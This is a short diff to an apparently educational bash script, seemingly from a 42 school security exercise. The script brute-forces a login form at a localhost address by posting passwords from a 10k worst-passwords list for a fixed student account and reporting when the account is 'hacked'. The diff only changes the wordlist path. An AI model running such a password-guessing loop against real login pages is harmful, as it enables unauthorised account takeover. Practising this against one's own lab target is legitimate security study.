@@ -9,7 +9,7 @@ make_green() {
 }
 
 domain="http://localhost:4942"
-filename="10k-worst-passwords.txt"
+filepath="./Resources/10k-worst-passwords.txt"
 joe="jdoe@student.42.tech"
 while read p; do
     location=$(curl -X POST "$domain"/login \
@@ -23,4 +23,4 @@ while read p; do
          echo "$(make_green SUCCESS!) joe was hacked. password: $p"
         break
      fi
-done <$filename
+done <$filepath
